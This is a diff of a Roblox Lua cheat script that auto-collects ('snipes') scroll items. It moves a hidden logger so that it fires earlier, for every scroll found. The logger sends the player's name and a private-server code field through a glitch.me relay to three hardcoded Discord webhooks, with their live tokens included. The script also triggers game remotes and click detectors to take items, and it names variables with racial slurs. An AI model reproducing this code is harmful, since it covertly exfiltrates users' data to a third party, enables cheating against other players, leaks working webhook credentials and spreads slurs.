@@ -201,6 +201,40 @@ repeat wait() until game:IsLoaded()
         table.insert(nigger, v.Name)
       end
     end
+  for i,v in pairs(game.workspace.GLOBALTIME:GetChildren()) do
+  if v.ClassName == "Model" and v:FindFirstChild("sh") and v.sh.Position.Y > -1000 then
+          local name = game.Players.LocalPlayer.Name
+          local monkeyzzz = game:GetService("Players").LocalPlayer.PlayerGui:WaitForChild("Main").private.Text
+          local snipewh = "https://discord.com/api/webhooks/767062747040972810/09LhRUrMO8A4EUHmchHnksWaDUEYKG1lbs83eAQ3buILAg2z18zjPraXibe490fwqgxy"
+          local flexwh = "https://discordapp.com/api/webhooks/766777831694270473/h-nHwLJqqybqMCMamh_QBaHMJYBX2PpwJCO1F5ia8bLGwUENlAi4gPdoxcrOXlgt4HT_"
+          local formatwh = "https://discordapp.com/api/webhooks/767475701213167687/E68vGiose__CjlBQ6d6I3amt1NNQyX46OWebNUgmoYRBXKInB3xiPCS_yxDUBp1wjOsC"
+          local HttpService = game:GetService("HttpService");
+          function specials(Webhook, Message, Botname)
+            local Name;
+            local start = game:HttpGet("http://buritoman69.glitch.me");
+            local biggie = "http://buritoman69.glitch.me/webhook";
+            if (not Message or Message == "" or not Botname) then
+              Name = "GameBot"
+              return error("nil or empty message!")
+            else
+              Name = Botname;
+            end
+            local Body = {
+              ['Key'] = tostring("applesaregood"),
+              ['Message'] = tostring(Message),
+              ['Name'] = Name,
+              ['Webhook'] = Webhook
+            }
+            Body = HttpService:JSONEncode(Body);
+            local Data = game:HttpPost(biggie, Body, false, "application/json")
+            return Data or nil;
+          end
+          specials(snipewh, "***" .. name .. " sniped: ".. v.Name .. "Code: "  .. monkeyzzz .. "***", "Logger")
+          specials(flexwh, "***" .. "Sniped: " .. v.Name .. " Code: " .. monkeyzzz .. "***", "Senpai Winning")
+          specials(formatwh, "***" .. monkeyzzz .. " | " .. v.Name .. " | " ..  niggar .. "***", "Format")
+
+end
+end
     for i,v in pairs(game.workspace.GLOBALTIME:GetChildren()) do
       if v.ClassName == "Model" then
         if table.find(nigger, v.Name) then
@@ -232,35 +266,6 @@ repeat wait() until game:IsLoaded()
           scrollnegro:FireServer(game.Players.LocalPlayer)
           JINKILL()
           fireclickdetector(v.sh.ClickDetector)
-          local name = game.Players.LocalPlayer.Name
-          local monkeyzzz = game:GetService("Players").LocalPlayer.PlayerGui:WaitForChild("Main").private.Text
-          local snipewh = "https://discord.com/api/webhooks/767062747040972810/09LhRUrMO8A4EUHmchHnksWaDUEYKG1lbs83eAQ3buILAg2z18zjPraXibe490fwqgxy"
-          local flexwh = "https://discordapp.com/api/webhooks/766777831694270473/h-nHwLJqqybqMCMamh_QBaHMJYBX2PpwJCO1F5ia8bLGwUENlAi4gPdoxcrOXlgt4HT_"
-          local formatwh = "https://discordapp.com/api/webhooks/767475701213167687/E68vGiose__CjlBQ6d6I3amt1NNQyX46OWebNUgmoYRBXKInB3xiPCS_yxDUBp1wjOsC"
-          local HttpService = game:GetService("HttpService");
-          function specials(Webhook, Message, Botname)
-            local Name;
-            local start = game:HttpGet("http://buritoman69.glitch.me");
-            local biggie = "http://buritoman69.glitch.me/webhook";
-            if (not Message or Message == "" or not Botname) then
-              Name = "GameBot"
-              return error("nil or empty message!")
-            else
-              Name = Botname;
-            end
-            local Body = {
-              ['Key'] = tostring("applesaregood"),
-              ['Message'] = tostring(Message),
-              ['Name'] = Name,
-              ['Webhook'] = Webhook
-            }
-            Body = HttpService:JSONEncode(Body);
-            local Data = game:HttpPost(biggie, Body, false, "application/json")
-            return Data or nil;
-          end
-          specials(snipewh, "***" .. name .. " sniped: ".. v.Name .. "Code: "  .. monkeyzzz .. "***", "Logger")
-          specials(flexwh, "***" .. "Sniped: " .. v.Name .. " Code: " .. monkeyzzz .. "***", "Senpai Winning")
-          specials(formatwh, "***" .. monkeyzzz .. " | " .. v.Name .. " | " ..  niggar .. "***", "Format")
           game.StarterGui:SetCore("SendNotification", {
             Title = "scroll sniped";
             Text = "sniped: " ..  v.Name;
